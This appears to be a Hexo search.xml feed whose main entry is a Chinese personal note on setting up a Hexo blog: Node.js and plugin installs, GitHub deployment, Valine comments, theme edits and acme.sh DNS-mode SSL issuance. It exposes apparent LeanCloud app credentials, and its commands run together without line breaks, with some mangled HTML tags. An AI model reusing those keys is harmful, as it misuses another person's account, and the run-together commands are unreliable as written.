      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><pre><code>wget http://nodejs.org/dist/v9.2.0/node-v9.2.0-linux-x64.tar.gztar -zxvf node-v9.2.0-linux-x64.tar.gzsudo mv node-v9.2.0-linux-x64 /opt/sudo ln -s /opt/node-v9.2.0-linux-x64/bin/node /usr/local/bin/node        sudo ln -s /opt/node-v9.2.0-linux-x64/bin/npm /usr/local/bin/npmsudo npm install hexo -g /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo -vsudo ln -s /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo /usr/local/bin/hexohexo inithexo servercurrent foldersudo npm install hexo-deployer-git --savesudo npm install hexo-generator-feed --savesudo npm install hexo-generator-sitemap --savesudo npm install hexo-generator-search --savesudo npm install hexo-front-matter-excerpt --savesudo npm install hexo-generator-index --savesudo npm install hexo-generator-archive --save sudo npm install hexo-generator-tag --savesudo npm install hexo-asset-image --savesudo npm install hexo-git-backup --savesudo npm install shelljs --save_config.yml.deploy:  type: git  repo: git@github.com:yourgithubname/yourgithubname.github.io.git  branch: masterbackup:    type: git    theme: landscape,next    repository:       github: git@github.com:yourgithubname/blog-backup.git,mastergit config --global user.name &quot;yourgithubname&quot;git config --global user.email &quot;z....x@xxx.com&quot;ssh-keygen -t rsa -C &quot;z....x@xxx.com&quot; ==&gt; id_rsa.pub   profile -&gt; Settings -&gt; SSH and GPG Keys -&gt; Add new SSH keyhexo clean &amp;&amp; hexo g &amp;&amp; hexo dgit clone https://github.com/viosey/hexo-theme-material.git themes/material安装访客量http://ibruce.info/2015/04/04/busuanzi/#more没加载出来前就显示旋转效果 ：打开themes/你的主题/layout/_partial/footer.ejs添加&lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css&quot;&gt;Total &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt; views.您是Sparrow博客的第&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;个小伙伴.换个简洁评论valinehttps://github.com/litten/hexo-theme-yilia/pull/646_config.yml : valine:  appid:  #Leancloud应用的appId   XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz appkey:  #Leancloud应用的appKey   aaBboz6UbNeJnPowxKNNDTm2https://material.viosey.com/docslanguage: zh-CNsearch:    path: search.xml    field: allbaidu_site_id: hexo bhexo-front-matter-excerpt 这个插件，默认是读取 &lt;!-- more --&gt;sparrow logo : https://i.loli.net/2018/03/26/5ab8be73b5b56.pngsudo npm install hexo-asset-image --save   图片引用post_asset_folder: truehexo n &quot;new artitle&quot;![xxx](new artitle/img.jpg)换成 next 主题：git clone https://github.com/iissnan/hexo-theme-next.git themes/next好用多了容易配置站点配置文件archive_generator:  per_page: 20  yearly: true  monthly: truetag_generator:  per_page: 10  about ：   没什么写的，有事留言吧!</code></pre><p>文章封面 </p><pre><code>https://neveryu.github.io/2017/07/15/hexo-next-five/修改 \themes\next\layout\_macro\post.swing 文件</code></pre><pre><code>{% if is_index %}<!-- 文章摘要图片 -->{% if post.summary_img  %}<d1v class="out-img-topic"><1mg src="{{" post.summary_img="" }}="" class="img-topic"></1mg></d1v>{% endif %} &lt;!-- 文章摘要图片 --&gt;</code></pre><p>之后： </p><pre><code>---title: Blog Installdate: 2017-11-25 00:00:00categories:   - 其他tags:summary_img: /images/avatar.png---</code></pre><pre><code>https://github.com/Neilpang/acme.sh/wiki/dns-manual-mode申请SSL(Secure socket layer) Server Certificate证书https://github.com/Neilpang/acme.sh    acme.sh 实现了 acme 协议, 可以从 letsencrypt 生成免费的证书.    一般来说是收费的，只有letsencrypt免费，谷歌浏览器登陆有letsencrypt免费证书的网页也会显示绿色的图标，因为也是安全的SSL    dns 方式, 在域名上添加一条 txt 解析记录, 验证域名所有权    你不需要任何服务器, 不需要任何公网 ip, 只需要 dns 的解析记录即可完成验证.     坏处是，如果不同时配置 Automatic DNS API，使用这种方式 acme.sh 将无法自动更新证书，每次都需要手动再次重新解析验证域名所有权。1. DNS manual modeacme.sh --issue -d example.com --dns --yes-I-know-dns-manual-mode-enough-go-ahead-please2. Please add the TXT record to your DNS records.    Domain: &#39;_acme-challenge.1sparrow.com&#39;   TXT value: &#39;OX5btHmMS1GSWrN01hFomW6l-pSRFccccccw44RCQk&#39;3. nslookup -q=txt _acme-challenge.1sparrow.comServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:_acme-challenge.1sparrow.com    text =        &quot;OX5btHmMS1GSWrN01hFomW6l-pSRFWXC62bywcccccck&quot;4. Now retry with --renew command.acme.sh --renew -d example.com --yes-I-know-dns-manual-mode-enough-go-ahead-please[Tue Apr 17 21:23:00 EDT 2018] Renew: &#39;1sparrow.com&#39;[Tue Apr 17 21:23:06 EDT 2018] Single domain=&#39;1sparrow.com&#39;[Tue Apr 17 21:23:06 EDT 2018] Getting domain auth token for each domain[Tue Apr 17 21:23:06 EDT 2018] Verifying:1sparrow.com[Tue Apr 17 21:23:24 EDT 2018] Success[Tue Apr 17 21:23:24 EDT 2018] Verify finished, start to sign.[Tue Apr 17 21:23:30 EDT 2018] Cert success.==&gt; but github can&#39;t enforce https for custom domain所以使用netlify 走亚马逊的CDN国内访问比github快支持自定义域名和证书免费</code></pre>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
  
  
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      <content type="html"><![CDATA[<a id="more"></a><p>Sparrow !</p><p>没什么写的，有事留言吧!</p>]]></content>
    </entry>
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>gallery</title>
      <link href="/gallery/index.html"/>
      <url>/gallery/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index-1.html"/>
      <url>/tags/index-1.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>timeline</title>
      <link href="/timeline/index.html"/>
      <url>/timeline/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
  
</search>
